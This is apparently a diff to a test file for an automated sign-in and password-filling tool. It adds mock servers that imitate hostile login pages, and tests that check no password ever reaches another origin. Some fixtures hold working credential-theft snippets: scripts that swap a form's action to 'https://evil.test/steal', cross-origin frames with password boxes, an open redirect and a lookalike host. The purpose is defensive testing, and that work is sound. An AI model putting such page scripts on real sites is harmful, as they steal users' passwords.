@@ -70,6 +70,8 @@ const PASSWORD_STEP = (action, ac = "current-password") => page("Enter your pass
 const WELCOME = page("Your account", `<h1>Who's watching?</h1><a href="/logout">Sign out</a>`);
 
 const posted = []; // { host, path, field } for every POST carrying a username or a password
+const gets = []; // host + path of every other request the fixture servers answered
+const CHALLENGE_FRAME = `<iframe src="https://captcha-host.test/recaptcha/api2/bframe?k=x" title="recaptcha challenge expires in two minutes" width="400" height="580"></iframe>`;
 function handler(scheme) {
   return (req, res) => {
     const host = String(req.headers.host ?? "").toLowerCase();
@@ -83,10 +85,15 @@ function handler(scheme) {
       req.on("end", () => {
         const f = new URLSearchParams(raw);
         for (const k of ["password", "email", "userLoginId"]) if (f.get(k) != null) posted.push({ scheme, host, path: u.pathname, field: k });
+        if (site === "cap.test" && u.pathname === "/login" && f.get("captoken") !== "tok-ok") return send(200, FORM("/login").replace("<h1>Sign In</h1>", "<h1>Sign In</h1><p>Something went wrong. Please try again.</p>"));
+        if (site === "capafter.test" && u.pathname === "/login") return send(200, page("Check", `<h1>One more step</h1>${CHALLENGE_FRAME}`));
+        if (site === "ef-slow.test" && u.pathname === "/signin") { setTimeout(() => redirect("/signin/password"), 3000); return; }
         if (u.pathname === "/signin" && site.startsWith("ef")) {
+          if (site === "ef-confirm.test") return redirect("/signin/confirm");
+          if (site === "ef-xframe.test") return redirect("/signin/framed");
           const next = { "ef.test": "/signin/password", "ef-port.test": "https://ef-port.test:8443/signin/password",
             "ef-http.test": "http://ef-http.test/signin/password", "ef-other.test": "https://evil.test/signin/password",
-            "ef-new.test": "/signin/create" }[site];
+            "ef-new.test": "/signin/create" }[site] ?? "/signin/password";
           return redirect(next);
         }
         return send(200, WELCOME);
@@ -109,6 +116,51 @@ function handler(scheme) {
       routes[s] = { "/": () => send(200, HOME("/signin")), "/signin": () => send(200, EMAIL_STEP("/signin")),
         "/signin/password": () => send(200, PASSWORD_STEP("/signin/password")), "/signin/create": () => send(200, PASSWORD_STEP("/signin/create", "new-password")) };
     }
+    // The review's fixtures (2026-11-13).
+    gets.push(`${site}${u.pathname}`);
+    const ef = (signin) => ({ "/": () => send(200, HOME("/signin")), "/signin": () => send(200, signin), "/signin/password": () => send(200, PASSWORD_STEP("/signin/password")) });
+    Object.assign(routes, {
+      // A same-site open redirect behind the home page's "Sign in" link, landing on another site's form.
+      "redir.test": { "/": () => send(200, HOME("/go?to=https://evil.test/signin/password")), "/go": () => redirect(u.searchParams.get("to")) },
+      // A lookalike host that merely starts with the site's name.
+      "look.test": { "/": () => send(200, HOME("https://look.test.evil.test/login")) },
+      "look.test.evil.test": { "/login": () => send(200, FORM("/login")) },
+      // The site's sign-in on its own subdomain: fine.
+      "sub.test": { "/": () => send(200, HOME("https://login.sub.test/login")) },
+      "login.sub.test": { "/login": () => send(200, FORM("/login")) },
+      // The only password box is inside another origin's frame.
+      "xframe.test": { "/login": () => send(200, page("Sign In", `<h1>Sign In</h1><label>Email <input type="email" name="email"></label><iframe src="https://evil.test/pwframe" width="400" height="200"></iframe>`)) },
+      "evil.test": { "/signin/password": () => send(200, PASSWORD_STEP("/steal")), "/pwframe": () => send(200, PASSWORD_STEP("/steal")), "/x": () => send(200, "<p>evil</p>") },
+      "ef-xframe.test": { ...ef(EMAIL_STEP("/signin")), "/signin/framed": () => send(200, page("Password", `<h1>Enter your password</h1><iframe src="https://evil.test/pwframe" width="400" height="200"></iframe>`)) },
+      // The form's action is swapped to another origin once the username is in.
+      "ef-action.test": ef(EMAIL_STEP("/signin", `<script>document.querySelector('input[name=email]').addEventListener('input', function () { document.forms[0].action = 'https://evil.test/steal'; });</script>`)),
+      // A navigation set off by the typing that starts just before the filler's own submit (300 ms in).
+      "ef-late.test": ef(EMAIL_STEP("/signin", `<script>document.querySelector('input[name=email]').addEventListener('input', function () { setTimeout(function () { location.href = '/signin/password'; }, 300); }, { once: true });</script>`)),
+      // A meta refresh to the password step, before anything is submitted.
+      "ef-meta.test": ef(EMAIL_STEP("/signin").replace("<head>", '<head><meta http-equiv="refresh" content="0.2;url=/signin/password">')),
+      // history.pushState to a lookalike path that draws its own password box, before our submit.
+      "ef-push.test": ef(EMAIL_STEP("/signin", `<script>document.querySelector('input[name=email]').addEventListener('input', function () { history.pushState({}, '', '/signin/password'); document.body.insertAdjacentHTML('beforeend', '<form method="post" action="/steal"><input type="password" name="password"></form>'); }, { once: true });</script>`)),
+      // After our submit: one password box the site calls "Confirm password".
+      "ef-confirm.test": { ...ef(EMAIL_STEP("/signin")), "/signin/confirm": () => send(200, page("Confirm", `<h1>Confirm your password</h1><form method="post" action="/signin/confirm"><label>Confirm password <input type="password" name="password" id="confirm-password"></label></form>`)) },
+      // An honest slow site: its password step comes 3 s after our submit.
+      "ef-slow.test": ef(EMAIL_STEP("/signin")),
+      // An honest single-page app: our click on Continue changes the path with pushState and draws the password box 1.2 s later.
+      "ef-spa.test": ef(page("Sign in", `<h1>Sign in</h1><div id="f"><label>Email <input type="email" name="email" autocomplete="username"></label><button type="button" id="go">Continue</button></div>
+        <script>document.getElementById('go').addEventListener('click', function () { setTimeout(function () { history.pushState({}, '', '/signin/password'); document.getElementById('f').innerHTML = '<form method="post" action="/signin/password"><label>Password <input type="password" name="password" autocomplete="current-password"></label><button type="submit">Sign in</button></form>'; }, 1200); });</script>`)),
+      // reCAPTCHA-like: the sign-in page loads another origin's script, and that script puts its own frame
+      // in when the username box is focused (the pin is exact by then); the frame posts a token the
+      // page's submit needs. The frame also carries a password box of its own, which must never be typed.
+      "cap.test": { "/login": () => send(200, FORM("/login").replace("</form>", `<input type="hidden" name="captoken" value=""></form><script src="https://captcha-host.test/api.js"></script>`)) },
+      "captcha-host.test": {
+        "/api.js": () => { res.writeHead(200, { "content-type": "text/javascript" }); res.end(`window.addEventListener('message', function (e) { if (e.origin === 'https://captcha-host.test') document.querySelector('[name=captoken]').value = e.data; });
+          document.querySelector('[name=userLoginId]').addEventListener('focus', function () { var f = document.createElement('iframe'); f.src = 'https://captcha-host.test/recaptcha/api2/anchor?size=invisible'; f.width = 256; f.height = 60; f.title = 'reCAPTCHA'; document.body.appendChild(f); }, { once: true });`); },
+        "/recaptcha/api2/anchor": () => send(200, `<form method="post" action="/steal"><input type="password" name="password"></form><script>parent.postMessage('tok-ok', '*');</script>`),
+        "/recaptcha/api2/bframe": () => send(200, "<p>Select all images with traffic lights</p>"),
+      },
+      // A visible picture challenge on the sign-in page itself, and one after the submit.
+      "capshow.test": { "/login": () => send(200, FORM("/login").replace("</form>", `</form>${CHALLENGE_FRAME}`)) },
+      "capafter.test": { "/login": () => send(200, FORM("/login")) },
+    });
     const fn = routes[site]?.[u.pathname];
     return fn ? fn() : send(404, "<p>not found</p>");
   };
@@ -252,4 +304,93 @@ test("email-first refused: another port, http, another origin, a new-password bo
     assert.ok(["not_signin_page", "origin_mismatch"].includes(out.result), `${site}: ${out.result}`);
     assert.deepEqual(passwordsTo(), [], `${site}: no password reached any server`);
   }
+});
+
+// ---------------------------------------------------------------- the ship review (2026-11-13)
+test("review, the pin: an open redirect behind the Sign in link, a lookalike host: no link; the site's own subdomain: pinned", skip, async () => {
+  const intake = await import("../src/loginintake.js");
+  const redir = await find("redir.test");
+  // The look-up may land on the other site's form, but the offer then refuses it: the pin is the final page, same site only.
+  if (redir.found) assert.notEqual(new URL(redir.url).hostname.endsWith("redir.test"), true, JSON.stringify(redir));
+  process.env.REASON_SAVED_LOGINS = "on";
+  const out = await intake.offerSaveLink(ME, "redir.test", "save my redir.test login", { locate: async () => redir });
+  assert.equal(out.ok, false, JSON.stringify(out));
+  const look = await find("look.test");
+  assert.deepEqual([look.found, look.why], [false, "off_site"], JSON.stringify(look));
+  const sub = await find("sub.test");
+  assert.deepEqual([sub.found, sub.url], [true, "https://login.sub.test/login"], JSON.stringify(sub));
+});
+
+test("review: a password box inside another origin's frame is never typed (a password page, and an email-first step)", skip, async () => {
+  for (const [site, url] of [["xframe.test", "https://xframe.test/login"], ["ef-xframe.test", "https://ef-xframe.test/signin"]]) {
+    posted.length = 0;
+    await save(site, url);
+    const out = await signIn(site);
+    assert.notEqual(out.result, "signed_in", site);
+    assert.deepEqual(passwordsTo(), [], `${site}: no password reached any server`);
+  }
+});
+
+test("review: action swapped off-origin, a late self-navigation, a meta refresh, a pushState lookalike, a confirm box: the password is never typed", skip, async () => {
+  for (const site of ["ef-action.test", "ef-late.test", "ef-meta.test", "ef-push.test", "ef-confirm.test"]) {
+    posted.length = 0;
+    await save(site, `https://${site}/signin`);
+    const out = await signIn(site);
+    assert.notEqual(out.result, "signed_in", site);
+    assert.deepEqual(passwordsTo(), [], `${site}: no password reached any server`);
+    assert.equal(posted.some(p => p.host === "evil.test"), false, `${site}: nothing reached another site`);
+  }
+});
+
+test("review: honest slow email-first sites still sign in (a 3 s server, a single-page app's pushState after our click)", skip, async () => {
+  for (const site of ["ef-slow.test", "ef-spa.test"]) {
+    posted.length = 0;
+    await save(site, `https://${site}/signin`);
+    const out = await signIn(site);
+    assert.equal(out.result, "signed_in", `${site}: ${out.say_exactly}`);
+    assert.deepEqual(passwordsTo().map(p => `${p.host}${p.path}`), [`${site}/signin/password`], site);
+  }
+});
+
+test("reCAPTCHA: the sign-in page's own cross-origin script and frame load under the lock; the password goes only into the top frame", skip, async () => {
+  posted.length = 0; gets.length = 0;
+  await save("cap.test", "https://cap.test/login");
+  const out = await signIn("cap.test");
+  assert.ok(gets.includes("captcha-host.test/api.js"), "the script loaded");
+  assert.ok(gets.includes("captcha-host.test/recaptcha/api2/anchor"), "the frame put in after the pin loaded");
+  assert.equal(out.result, "signed_in", out.say_exactly);
+  assert.deepEqual(passwordsTo().map(p => `${p.host}${p.path}`), ["cap.test/login"], "only the top frame's form carried it");
+});
+
+test("reCAPTCHA: a visible picture challenge stops it as blocked, before typing or after the submit, and it does not retry", skip, async () => {
+  posted.length = 0;
+  await save("capshow.test", "https://capshow.test/login");
+  const a = await signIn("capshow.test");
+  assert.equal(a.result, "blocked", a.say_exactly);
+  assert.deepEqual(passwordsTo(), [], "nothing typed under a visible challenge");
+  await save("capafter.test", "https://capafter.test/login");
+  const b = await signIn("capafter.test");
+  assert.equal(b.result, "blocked", b.say_exactly);
+  const again = await signIn("capafter.test");
+  assert.equal(again.result, "paused", "one refusal stops");
+});
+
+test("review: the lock still refuses a top-level page on another origin while a sub-frame may load", skip, async () => {
+  const s = await launch({ conversationId: "dm:lock-probe" });
+  try {
+    await browser.guardContext(s.context, { conversationId: "dm:lock-probe" });
+    const p = s.context.pages()[0] ?? await s.context.newPage();
+    await p.goto("https://cap.test/login", { waitUntil: "domcontentloaded" });
+    browser.pinSite("dm:lock-probe", "cap.test", { hosts: ["cap.test"], exact: "https://cap.test", secure: true });
+    gets.length = 0;
+    await p.evaluate(() => { const f = document.createElement("iframe"); f.src = "https://evil.test/x"; document.body.appendChild(f); });
+    await p.waitForTimeout(800);
+    assert.ok(gets.includes("evil.test/x"), "a sub-frame loads");
+    let refused = false;
+    try { await p.goto("https://evil.test/x", { timeout: 5000 }); } catch { refused = true; }
+    assert.equal(refused, true, "a top-level load off the pin is refused");
+    assert.equal(new URL(p.url()).hostname, "cap.test");
+    await p.waitForTimeout(500);
+    assert.notEqual(new URL(p.url()).hostname, "evil.test", "still not on the other origin");
+  } finally { browser.unpinSite("dm:lock-probe"); await s.close(); }
 });
